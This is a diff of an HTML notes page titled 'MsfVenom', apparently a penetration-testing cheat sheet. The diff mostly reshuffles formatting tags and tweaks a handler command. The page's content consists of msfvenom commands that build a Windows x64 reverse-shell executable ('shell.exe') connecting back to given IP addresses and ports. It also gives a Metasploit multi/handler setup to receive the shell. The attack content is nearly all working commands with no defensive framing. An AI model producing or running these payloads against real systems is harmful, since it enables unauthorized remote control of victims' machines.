@@ -4,20 +4,19 @@
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>MsfVenom</title>
 </head><body><br/>
-<u><div style="text-align: left"><span style="font-family: andale mono"><span style="font-size: 14pt">Creating a Payload:</span></span></div></u><br/>
-<b><span style="font-size: 10pt">msfvenom -p [payload] LHOST=[listeninghost] LPORT=[listeningport]</span></b>&nbsp; <br/>
+<span style="font-size: 14pt"><span style="font-family: andale mono"><div style="text-align: left"><u>Creating a Payload:</u></div></span></span><br/>
+<span style="font-size: 10pt"><b>msfvenom -p [payload] LHOST=[listeninghost] LPORT=[listeningport]</b></span>&nbsp; <br/>
 <b>msfvenom -p &nbsp;windows/x64/shell_reverse_tcp</b>&nbsp; <b>&nbsp;lhost=172.20.10.11 lport=1234 -f exe -o shell.exe</b>&nbsp;<br/>
 <b>msfvenom -p windows/x64/shell_reverse_tcp lhost=172.21.1.1 lport=443 -f exe -o shell.exe</b>&nbsp;<br/>
 <br/>
 <br/>
 <br/>
-<u><span style="font-size: 14pt">Creating handler</span></u><br/>
+<span style="font-size: 14pt"><u>Creating handler</u></span><br/>
 <b>use exploit/multi/handler<br/>
 set PAYLOAD &nbsp;windows/x64/shell_reverse_tcp<br/>
 set LHOST 192.168.1.49<br/>
 set LPORT 1234<br/>
-set ExitOnSession false<br/>
-exploit -j -z<br/>
+exploit -j <br/>
 <br/>
 <br/>
 <u>List payloads</u><br/>
